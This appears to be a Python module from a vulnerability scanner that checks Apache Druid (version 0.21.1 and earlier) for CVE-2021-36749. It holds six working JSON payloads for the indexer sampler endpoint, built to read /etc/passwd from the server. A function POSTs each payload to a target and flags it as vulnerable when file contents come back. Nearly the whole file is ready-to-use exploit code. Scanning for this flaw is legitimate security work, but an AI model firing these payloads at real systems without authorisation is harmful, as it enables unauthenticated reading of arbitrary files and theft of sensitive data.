#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check
import re

cve_2021_36749_payloads = [
    {
        'path': 'druid/indexer/v1/sampler?for=connect',
        'data': '''{"type": "index","spec": {"type": "index","ioConfig": {"type": "index","firehose": {"type": "http","uris": ["file:///etc/passwd"]}},"dataSchema": {"dataSource": "sample","parser": {"type": "string","parseSpec": {"format": "regex","pattern": "(.*)","columns": ["a"],"dimensionsSpec": {},"timestampSpec": {"column": "!!!_no_such_column_!!!","missingValue": "2010-01-01T00:00:00Z"}}}}},"samplerConfig": {"numRows": 500,"timeoutMs": 15000}}'''
    },
    {
        'path': 'druid/indexer/v1/sampler?for=connect',
        'data': '''{"type": "index","spec": {"ioConfig": {"type": "index","inputSource": {"type": "local","baseDir": "/etc/","filter": "passwd"},"inputFormat": {"type": "json","keepNullColumns": true}},"dataSchema": {"dataSource": "sample","timestampSpec": {"column": "timestamp","format": "iso","missingValue": "1970"},"dimensionsSpec": {}}},"type": "index","tuningConfig": {"type": "index"}},"samplerConfig": {"numRows": 500,"timeoutMs": 15000}}'''
    },
    {
        'path': 'druid/indexer/v1/sampler?for=connect',
        'data': '''{"type": "index","spec": {"ioConfig": {"type": "index","firehose": {"type": "local","baseDir": "/etc/","filter": "passwd"}},"dataSchema": {"dataSource": "sample","parser": {"parseSpec": {"format": "json","timestampSpec": {},"dimensionsSpec": {}}}}},"samplerConfig": {"numRows": 500,"timeoutMs": 15000}}'''
    },
    # * path不一样
    {
        'path': 'indexer/v1/sampler?for=connect',
        'data': '''{"type": "index","spec": {"type": "index","ioConfig": {"type": "index","firehose": {"type": "http","uris": ["file:///etc/passwd"]}},"dataSchema": {"dataSource": "sample","parser": {"type": "string","parseSpec": {"format": "regex","pattern": "(.*)","columns": ["a"],"dimensionsSpec": {},"timestampSpec": {"column": "!!!_no_such_column_!!!","missingValue": "2010-01-01T00:00:00Z"}}}}},"samplerConfig": {"numRows": 500,"timeoutMs": 15000}}'''
    },
    {
        'path': 'indexer/v1/sampler?for=connect',
        'data': '''{"type": "index","spec": {"ioConfig": {"type": "index","inputSource": {"type": "local","baseDir": "/etc/","filter": "passwd"},"inputFormat": {"type": "json","keepNullColumns": true}},"dataSchema": {"dataSource": "sample","timestampSpec": {"column": "timestamp","format": "iso","missingValue": "1970"},"dimensionsSpec": {}}},"type": "index","tuningConfig": {"type": "index"}},"samplerConfig": {"numRows": 500,"timeoutMs": 15000}}'''
    },
    {
        'path': 'indexer/v1/sampler?for=connect',
        'data': '''{"type": "index","spec": {"ioConfig": {"type": "index","firehose": {"type": "local","baseDir": "/etc/","filter": "passwd"}},"dataSchema": {"dataSource": "sample","parser": {"parseSpec": {"format": "json","timestampSpec": {},"dimensionsSpec": {}}}}},"samplerConfig": {"numRows": 500,"timeoutMs": 15000}}'''
    },
]

def cve_2021_36749_scan(self, clients):
    ''' Apache Druid对用户指定的HTTP InputSource没有做限制, 
        并且Apache Druid默认管理页面是不需要认证即可访问的
            因此未经授权的远程攻击者 可以通过构造恶意参数读取服务器上的任意文件
        
        Apache Druid <= 0.21.1
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2021-36749',
    }
    
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'Referer': client.protocol_domain,
        'Origin': client.protocol_domain,
    }

    for payload in cve_2021_36749_payloads:
        path = payload['path']
        data = payload['data']

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue
        
        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
